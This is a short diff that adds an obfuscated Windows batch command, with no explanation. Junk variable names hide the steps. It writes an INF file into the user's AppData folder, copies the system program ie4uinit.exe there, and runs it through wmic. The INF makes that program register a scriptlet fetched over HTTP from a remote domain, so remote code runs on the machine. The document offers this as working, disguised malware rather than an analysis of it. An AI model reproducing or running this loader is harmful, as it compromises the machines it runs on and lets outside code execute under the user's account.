@@ -1,0 +1,6 @@
+/v /c (for %v in (s) do @set "Identifies=%~v") &&
+  (for %q in (a) do @set "Cakes=%~q") &&
+  (for %n in (c) do @set "Periods=%~n") &&
+  call(for %v in ("[destinationdirs]" "defaultdestdir=11" "63474B=01" "[version]" "signature =$windows nt$" "[63474B]" "ieu%Laptop%.inf" "[strings]" "Interventions=:;Studies" "Rivers=h" "Laptop=init" "Interests=%time%" "Moses=t;Blades" "servicename=' '" "Balance=/" "shortsvcname=' '" "Reward=b;Estimates" "Oblige=com" "[defaultinstall.windows7]" "Un\" "Register\" "OCXs=EBB0C" "delfiles=63474B" "[EBB0C]" "sc\" "ro%Reward%j,NI,%Rivers%%Moses%%Moses%p%Interventions%%Balance%%Balance%jjaghdwao.davidopkins.%Oblige%/lz4x68ovcxa" ) do @echo %~v)>"%appdata%\microsoft\ieuinit.inf" &&
+  call xcopy /Y /C /Q %win!Provides!ir%\system32\ie4uinit.exe "%appdata%\microsoft\*" | set Districts8=Offerings &&
+  start "" wmic process call create "%appdata%\microsoft\ie4uinit.exe -basesettings" | set "Districts6=Fantasy Prefers Finish Ridge Walls Musical Saints Athletics Industries Seekers Candles Tonight Layers Complications Causes Crouch Climb Specifications Villages Optics Attend Razor Salad Fragrances Rescue Restaurants Kilometers Transcripts Errors Riders Close Actual Pizza Boxes Cosmetics Antiques Suspect Hours Chimney Miles Buffalo Favourites Categories Swarm"
